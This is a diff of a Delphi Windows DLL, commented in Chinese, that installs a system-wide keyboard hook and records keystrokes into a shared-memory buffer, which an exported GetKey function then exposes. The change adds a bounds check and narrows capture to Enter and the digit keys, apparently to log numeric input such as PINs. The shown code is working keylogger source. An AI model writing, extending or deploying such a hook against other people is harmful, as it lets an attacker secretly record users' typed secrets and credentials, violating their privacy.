@@ -5,14 +5,15 @@ interface
 uses
   Windows, Messages, SysUtils;
 
-const BUFFER_SIZE = 16 * 1024;              //文件映射到内存的大小
-const HOOK_MEM_FILENAME = 'MEM_FILE';       //映像文件名称
-const HOOK_MUTEX_NAME = 'MUTEX_NAME';       //互斥名称
+const
+  BUFFER_SIZE = 16 * 1024;                  //文件映射到内存的大小
+  HOOK_MEM_FILENAME = 'MEM_FILE';           //映像文件名称
+  HOOK_MUTEX_NAME = 'MUTEX_NAME';           //互斥名称
 
 type
   //共享数据结构
   TShared = record
-    Keys: array[0..BUFFER_SIZE - 1] of ShortString;
+    Keys: array[0..BUFFER_SIZE - 1] of string;
     KeyCount: Integer;
   end;
   //共享数据结构指针
@@ -30,7 +31,7 @@ function KeyHookProc(iCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT;
   stdcall; export;
 var
   vKey: Integer;
-  TmpStr: ShortString;
+  TmpStr: string;
 begin
   if iCode < 0 then
     Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam)
@@ -44,154 +45,43 @@ begin
       if GetAsyncKeyState(vKey) = -32767 then
       begin
         case vKey of
-          8:   TmpStr := '[BackSpace]';
-          9:   TmpStr := '[Tab]';
           13:  TmpStr := '[Enter]';
-          17:  TmpStr := '[Ctrl]';
-          27:  TmpStr := '[Esc]';
-          32:  TmpStr := '[BlankSpace]';
 
-          //Del, Ins, Home, PageUp, PageDown, End
-          33:  TmpStr := '[Page Up]';
-          34:  TmpStr := '[Page Down]';
-          35:  TmpStr := '[End]';
-          36:  TmpStr := '[Home]';
-
-          //Arrow Up, Down, Left, Right
-          37:  TmpStr := '[Left]';
-          38:  TmpStr := '[Up]';
-          39:  TmpStr := '[Right]';
-          40:  TmpStr := '[Down]';
-
-          //PrintScreen, Insert, Delete, ScrollLock
-          44:  TmpStr := '[Print Screen]';
-          45:  TmpStr := '[Insert]';
-          46:  TmpStr := '[Del]';
-          145: TmpStr := '[Scroll Lock]';
-
-          //Number: 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 Symbol: !, @, #, $, %, ^, &, *, (, )
-          48:  if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := ')'
-               else
+          //Number: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9
+          48:  if GetKeyState(VK_SHIFT) >= 0 then
                  TmpStr := '0';
-          49:  if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '!'
-               else
-                 TmpStr := '1';
-          50:  if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '@'
-               else
-                 TmpStr := '2';
-          51:  if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '#'
-               else
-                 TmpStr := '3';
-          52:  if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '$'
-               else
-                 TmpStr := '4';
-          53:  if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '%'
-               else
-                 TmpStr := '5';
-          54:  if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '^'
-               else
-                 TmpStr := '6';
-          55:  if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '&'
-               else
-                 TmpStr := '7';
-          56:  if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '*'
-               else
-                 TmpStr := '8';
-          57:  if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '('
-               else
-                 TmpStr := '9';
-          //a..z, A..Z
-          65..90:
-               begin
-                 if ((GetKeyState(VK_CAPITAL)) = 1) then
-                   if GetKeyState(VK_SHIFT) < 0 then
-                     //a..z
-                     TmpStr := LowerCase(Chr(vKey))
-                   else
-                     //A..Z
-                     TmpStr := UpperCase(Chr(vKey))
-                 else
-                   if GetKeyState(VK_SHIFT) < 0 then
-                     //A..Z
-                     TmpStr := UpperCase(Chr(vKey))
-                   else
-                     //a..z
-                     TmpStr := LowerCase(Chr(vKey));
-               end;
 
-          //Win
-          91: TmpStr := '[LWin]';
-          92: TmpStr := '[RWin]';
+          49:  if GetKeyState(VK_SHIFT) >= 0 then
+                 TmpStr := '1';
+
+          50:  if GetKeyState(VK_SHIFT) >= 0 then
+                 TmpStr := '2';
+
+          51:  if GetKeyState(VK_SHIFT) >= 0 then
+                 TmpStr := '3';
+
+          52:  if GetKeyState(VK_SHIFT) >= 0 then
+                 TmpStr := '4';
+
+          53:  if GetKeyState(VK_SHIFT) >= 0 then
+                 TmpStr := '5';
+
+          54:  if GetKeyState(VK_SHIFT) >= 0 then
+                 TmpStr := '6';
+
+          55:  if GetKeyState(VK_SHIFT) >= 0 then
+                 TmpStr := '7';
+
+          56:  if GetKeyState(VK_SHIFT) >= 0 then
+                 TmpStr := '8';
+
+          57:  if GetKeyState(VK_SHIFT) >= 0 then
+                 TmpStr := '9';
 
           //NumberPad
           96..105:
                //Number: 0..9
                TmpStr := IntToStr(vKey - 96);
-          106: TmpStr := '*';
-          107: TmpStr := '+';
-          109: TmpStr := '-';
-          110: TmpStr := '.';
-          111: TmpStr := '/';
-          144: TmpStr := '[Num Lock]';
-
-          //F1-F12
-          112..123:
-               TmpStr := '[F' + IntToStr(vKey - 111) + ']';
-
-          186: if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := ':'
-               else
-                 TmpStr := ';';
-          187: if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '+'
-               else
-                 TmpStr := '=';
-          188: if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '<'
-               else
-                 TmpStr := ',';
-          189: if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '_'
-               else
-                 TmpStr := '-';
-          190: if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '>'
-               else
-                 TmpStr := '.';
-          191: if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '?'
-               else
-                 TmpStr := '/';
-          192: if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '~'
-               else
-                 TmpStr := '`';
-          219: if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '{'
-               else
-                 TmpStr := '[';
-          220: if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '|'
-               else
-                 TmpStr := '\';
-          221: if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '}'
-               else
-                 TmpStr := ']';
-          222: if GetKeyState(VK_SHIFT) < 0 then
-                 TmpStr := '"'
-               else
-                 TmpStr := '''';
         end;
 
         //将获取的按键信息写入缓冲区
@@ -223,7 +113,7 @@ begin
   Result := (hOldKeyHook <> 0);
 end;
 
-{卸载键盘钩子}
+//卸载键盘钩子
 function DisableKeyHook: BOOL; export;
 begin
   if hOldKeyHook <> 0 then
@@ -243,9 +133,12 @@ begin
 end;
 
 //返回指定按键
-function GetKey(Index: Integer): ShortString; export;
+function GetKey(Index: Integer): string; export;
 begin
-  Result := Shared^.Keys[Index];
+  Result := '';
+
+  if (Index > -1) and (Index < BUFFER_SIZE) then
+    Result := Shared^.Keys[Index];
 end;
 
 //清空存放按键的缓冲区
